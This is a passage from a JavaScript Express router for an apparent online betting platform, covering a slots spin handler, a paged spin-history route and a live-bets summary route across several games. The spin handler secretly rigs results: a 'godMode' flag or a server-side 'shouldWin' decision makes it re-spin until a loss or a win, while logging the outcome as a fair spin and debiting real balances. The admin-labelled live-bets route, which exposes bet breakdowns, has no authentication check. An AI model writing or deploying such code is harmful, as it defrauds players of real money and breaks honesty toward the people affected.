      const godMode_sl   = await isGodMode(req.user._id, req);
      if (godMode_sl || !shouldWin_sl) {
        // Force LOSS: re-spin until no win
        let attempts = 0;
        while (multiplier > 0 && attempts++ < 30) ({ reels, multiplier, winLine } = spinSlots());
        multiplier = 0; winLine = 'No win';
      } else if (shouldWin_sl && multiplier === 0) {
        // Force WIN: keep spinning until win
        let attempts = 0;
        while (multiplier === 0 && attempts++ < 30) ({ reels, multiplier, winLine } = spinSlots());
      }
      const won=multiplier>0, prize=won?Math.floor(betAmount*multiplier):0;
      const user = await deductBet(req.user._id, betAmount);
      if (!user) return res.status(400).json({ success:false, message:'Insufficient balance' });
      await SlotsGame.create({ userId:user._id, betAmount, reels, won, prize, multiplier, winLine });
      await Transaction.create({ user:user._id, type:'loss', amount:betAmount, status:'success', note:'Slots spin' });
      let finalBalance=user.balance;
      if(won) {
        const updated = await creditWin(user._id, prize);
        finalBalance = updated.balance;
        await Transaction.create({ user:user._id, type:'win', amount:prize, status:'success', note:`Slots WIN ${multiplier}x · ${winLine}` });
      }
      res.json({ success:true, reels, won, prize, multiplier, winLine, newBalance:finalBalance });
    } catch(e) { logger.error('[slots/spin] '+e.message); res.status(500).json({ success:false, message:'Server error' }); }
  });

  router.get('/slots/history', protect, async (req, res) => {
    try {
      const page  = Math.max(1, parseInt(req.query.page)  || 1);
      const limit = Math.min(100, Math.max(1, parseInt(req.query.limit) || 20));
      const skip  = (page - 1) * limit;
      const query = { userId:req.user._id };
      const [games, total] = await Promise.all([
        SlotsGame.find(query).sort({ createdAt:-1 }).skip(skip).limit(limit).select('betAmount won prize multiplier winLine createdAt'),
        SlotsGame.countDocuments(query),
      ]);
      res.json({ success:true, games, pagination:{ page, limit, total, pages: Math.ceil(total/limit) } });
    } catch(e) { res.status(500).json({ success:false, message:'Server error' }); }
  });


  // ── LIVE BETS SUMMARY — for admin panel ─────────────────────────────────────
  router.get('/live-bets', async (req, res) => {
    try {
      const results = {};
      const wingoGames = ['wingo30s','wingo1m','wingo3m','wingo5m'];
      results.wingo = {};
      for (const gid of wingoGames) {
        const st = req.app.locals.getWingoState ? req.app.locals.getWingoState(gid) : null;
        if (!st || !st.periodId) { results.wingo[gid] = null; continue; }
        const round = await WingoRound.findOne({ periodId: st.periodId });
        if (!round) { results.wingo[gid] = null; continue; }
        const breakdown = {};
        for (const b of round.bets) {
          if (!breakdown[b.choice]) breakdown[b.choice] = { count:0, total:0 };
          breakdown[b.choice].count++;
          breakdown[b.choice].total += b.amount;
        }
        results.wingo[gid] = { periodId:st.periodId, secLeft:st.sec, totalBets:round.totalBets, betCount:round.bets.length, breakdown };
      }
      const trxSt = req.app.locals.getTrxState ? req.app.locals.getTrxState() : null;
      if (trxSt && trxSt.periodId) {
        const round = await TrxWingoRound.findOne({ periodId: trxSt.periodId });
        if (round) {
          const breakdown = {};
          for (const b of round.bets) {
            if (!breakdown[b.choice]) breakdown[b.choice] = { count:0, total:0 };
            breakdown[b.choice].count++;
            breakdown[b.choice].total += b.amount;
          }
          results.trxwingo = { periodId:trxSt.periodId, secLeft:trxSt.sec, totalBets:round.totalBets, betCount:round.bets.length, breakdown };
        }
      }
      const k3St = req.app.locals.getK3State ? req.app.locals.getK3State() : null;
      if (k3St && k3St.periodId) {
        const round = await K3Round.findOne({ periodId: k3St.periodId });
        if (round) {
          const breakdown = {};
          for (const b of round.bets) {
            if (!breakdown[b.choice]) breakdown[b.choice] = { count:0, total:0 };
            breakdown[b.choice].count++;
            breakdown[b.choice].total += b.amount;
          }
          results.k3 = { periodId:k3St.periodId, secLeft:k3St.sec, totalBets:round.totalBets, betCount:round.bets.length, breakdown };
        }
      }
      const fdSt = req.app.locals.getFiveDState ? req.app.locals.getFiveDState() : null;
      if (fdSt && fdSt.periodId) {
        const round = await FiveDRound.findOne({ periodId: fdSt.periodId });
        if (round) {
          const breakdown = {};
          for (const b of round.bets) {
            const key = b.betType+':'+b.choice;
            if (!breakdown[key]) breakdown[key] = { count:0, total:0 };
            breakdown[key].count++;
            breakdown[key].total += b.amount;
          }
          results.fived = { periodId:fdSt.periodId, secLeft:fdSt.sec, totalBets:round.totalBets, betCount:round.bets.length, breakdown };
        }
      }
      const avSt = req.app.locals.getAvState ? req.app.locals.getAvState() : null;
      if (avSt && avSt.dbRoundId) {
        const round = await AviatorRound.findById(avSt.dbRoundId);
        if (round) {
          results.aviator = { periodId:avSt.periodId, phase:avSt.phase, mult:avSt.mult, totalBets:round.totalBets, betCount:round.bets.length, activeBets:round.bets.filter(b=>!b.cashedOut).length, cashedOut:round.bets.filter(b=>b.cashedOut).length };
        }
      }
      res.json({ success:true, ...results });
    } catch(e) { logger.error('[live-bets] '+e.message); res.status(500).json({ success:false, message:'Server error' }); }
  });

  return router;
};

// PATCHED BELOW - live-bets route added to module.exports above
